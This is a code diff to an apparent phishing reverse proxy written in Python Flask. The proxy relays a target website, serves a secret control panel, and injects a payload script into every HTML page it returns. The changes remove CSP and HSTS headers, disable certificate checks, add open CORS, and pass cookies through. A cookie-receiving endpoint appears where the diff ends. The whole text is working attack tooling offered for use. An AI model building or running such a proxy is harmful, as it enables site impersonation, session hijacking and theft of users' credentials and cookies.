@@ -67,7 +67,10 @@ def start_proxy(target, host, port, secret):
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
-        # Check if it's a panel request first
+        # Debug logging
+        print(f"[*] Incoming request: {request.method} {path}")
+        
+        # Handle panel requests
         if secret in path:
             if path == secret:
                 return panel_index()
@@ -75,9 +78,16 @@ def start_proxy(target, host, port, secret):
                 filename = path[len(f"{secret}/"):]
                 return panel_files(filename)
 
-        # Regular proxy handling
-        target_url = f"https://{target}/{path}"
+        # Build target URL properly
+        if not path and not request.query_string:
+            target_url = f"https://{target}"
+        else:
+            target_url = f"https://{target}/{path}"
+            if request.query_string:
+                target_url += f"?{request.query_string.decode()}"
         
+        print(f"[*] Proxying to: {target_url}")
+
         # Handle OPTIONS for CORS
         if request.method == 'OPTIONS':
             return Response('', 200, {
@@ -86,52 +96,83 @@ def start_proxy(target, host, port, secret):
                 'Access-Control-Allow-Headers': '*'
             })
 
-        # Forward headers but exclude problematic ones
-        headers = {
-            key: value for key, value in request.headers if key.lower() not in [
-                'host', 'content-length', 'connection'
-            ]
-        }
-        headers['Host'] = target
-
         try:
+            # Forward the request
             resp = requests.request(
                 method=request.method,
                 url=target_url,
-                headers=headers,
-                params=request.args,
+                headers={
+                    key: value for key, value in request.headers if key.lower() not in [
+                        'host', 
+                        'content-length',
+                        'connection',
+                        'origin',
+                        'referer'
+                    ]
+                },
                 data=request.get_data(),
                 cookies=request.cookies,
-                allow_redirects=False,
-                verify=False
+                allow_redirects=True,  # Allow redirects within the proxy
+                verify=False,
+                stream=True  # Stream the response
             )
 
             # Process response headers
-            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
+            excluded_headers = [
+                'content-encoding', 
+                'content-length', 
+                'transfer-encoding', 
+                'connection',
+                'strict-transport-security',
+                'content-security-policy'
+            ]
+            
             headers = [
                 (name, value) 
-                for (name, value) in resp.raw.headers.items() 
+                for name, value in resp.raw.headers.items() 
                 if name.lower() not in excluded_headers
             ]
 
-            # Inject payload if HTML
-            response = resp.content
-            if 'text/html' in resp.headers.get('Content-Type', ''):
+            # Add CORS headers
+            headers.extend([
+                ('Access-Control-Allow-Origin', '*'),
+                ('Access-Control-Allow-Methods', '*'),
+                ('Access-Control-Allow-Headers', '*')
+            ])
+
+            # Process and inject payload if HTML
+            content_type = resp.headers.get('Content-Type', '')
+            if 'text/html' in content_type.lower():
                 try:
-                    decoded = response.decode('utf-8')
+                    content = resp.content.decode('utf-8')
                     payload = '<script src="/payload-script.js"></script>'
-                    if '</head>' in decoded:
-                        decoded = decoded.replace('</head>', f'{payload}</head>')
-                    elif '<body>' in decoded:
-                        decoded = decoded.replace('<body>', f'<body>{payload}')
-                    response = decoded.encode('utf-8')
+                    
+                    if '</head>' in content:
+                        content = content.replace('</head>', f'{payload}</head>')
+                    elif '<body>' in content:
+                        content = content.replace('<body>', f'<body>{payload}')
+                    
+                    # Fix relative URLs
+                    content = content.replace('href="/', f'href="/{path}' if path else 'href="/')
+                    content = content.replace('src="/', f'src="/{path}' if path else 'src="/')
+                    
+                    return Response(
+                        content.encode('utf-8'),
+                        resp.status_code,
+                        headers
+                    )
                 except UnicodeDecodeError:
                     pass
 
-            return Response(response, resp.status_code, headers)
+            # Return raw response if not HTML or if processing failed
+            return Response(
+                resp.raw.read(),
+                resp.status_code,
+                headers
+            )
 
         except Exception as e:
-            print(f"Proxy Error: {str(e)}")
+            print(f"[!] Proxy Error: {str(e)}")
             return f"Error: {str(e)}", 500
 
     @app.route('/ep/api/cookies', methods=['POST'])
